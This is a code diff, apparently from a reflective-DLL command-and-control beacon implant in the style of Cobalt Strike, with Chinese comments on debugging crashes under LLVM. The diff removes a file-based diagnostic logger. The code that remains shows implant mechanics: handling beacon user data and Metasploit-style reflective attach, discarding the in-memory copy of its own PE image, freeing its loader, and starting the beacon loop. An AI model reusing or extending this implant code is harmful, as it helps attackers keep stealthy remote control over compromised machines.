@@ -161,40 +161,16 @@ typedef struct {
 
 static SYSCALL_API_UD g_udrl_syscalls = { NULL, 0 };
 
-/* BW_DIAG 前导链标记（定位 LLVM 版 pre-beacon 崩溃点） */
-static void bw_diag2(const char *stage) {
-	/* 无 CRT 依赖（_snprintf 在 LLVM+反射组合下崩——见 vsprintf_s 取证）：
-	   手搓 [tick] stage
- */
-	HANDLE h = CreateFileA("C:\\lab\\diag2.txt", GENERIC_WRITE, FILE_SHARE_READ,
-		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (h == INVALID_HANDLE_VALUE) return;
-	SetFilePointer(h, 0, NULL, FILE_END);
-	char buf[96]; int n = 0;
-	unsigned int t = GetTickCount();
-	buf[n++] = '[';
-	for (int sh = 28; sh >= 0; sh -= 4) {
-		int v = (t >> sh) & 0xF;
-		buf[n++] = (char)(v < 10 ? '0' + v : 'A' + v - 10);
-	}
-	buf[n++] = ']'; buf[n++] = ' ';
-	while (*stage && n < 90) buf[n++] = *stage++;
-	buf[n++] = '\r'; buf[n++] = '\n';
-	DWORD w; WriteFile(h, buf, n, &w, NULL);
-	CloseHandle(h);
-}
 #ifdef BW_PLAIN_SLEEP
 extern "C" void __cdecl crashdiag_disarm(void);
 #endif
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 	MEMORY_BASIC_INFORMATION mbi;
-	bw_diag2("dllmain_top");
 
 	switch( dwReason ) {
 		case DLL_BEACON_USER_DATA: {
 			USER_DATA_UD * ud = (USER_DATA_UD *)lpReserved;
-			bw_diag2("user_data");
 			if (ud != NULL && ud->length >= 8 && ud->version >= 1) {
 				BeaconSetCustomUserData(ud->customData);
 				if (ud->length >= (unsigned int)(sizeof(USER_DATA_UD) - 32)) {
@@ -210,14 +186,10 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			break;
 		case DLL_PROCESS_ATTACH:
 			/* 只解析配置；beacon 循环不在 ATTACH 阶段启动 —— 见 DLL_METASPLOIT_ATTACH。 */
-			bw_diag2("attach_in");
 			settings_init_once(hinstDLL);
-			bw_diag2("attach_settings_done");
 			register_exception_tables(hinstDLL);
-			bw_diag2("attach_done");
 			break;
 		case DLL_METASPLOIT_ATTACH:
-			bw_diag2("rdll_enter");
 #ifdef BW_PLAIN_SLEEP
 			/* A/B：禁用 crashdiag 的 VEH（它用 CRT fprintf，LLVM 下自爆且污染
 			 * 崩溃现场——cd_veh 抢在一切异常前），让 cdb first-chance 抓到真死点 */
@@ -233,12 +205,10 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			   缺陷返回，显式结束线程，杜绝跌落。 */
 			settings_init_once(hinstDLL);
 			register_exception_tables(hinstDLL);
-			bw_diag2("post_settings");
 
 			/* P4: drop the container's decode buffer (full PE copy of us)
 			   before the beacon loop starts - see container_release() */
 			container_release(lpReserved, hinstDLL);
-			bw_diag2("post_container");
 
 			/* clean up our loader（legacy 非映像加载路径：CLEANUP=1 且镜像为
 			   VirtualAlloc 私有内存时释放自身；映像-backed 路径 CLEANUP=0） */
@@ -253,7 +223,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			}
 
 			/* start our beaconing process, please!（不返回：循环 + safe_exit 终止） */
-			bw_diag2("pre_beacon");
 			beacon(lpReserved);
 
 			/* 防御性兜底：正常情况下不可达（见上）。 */
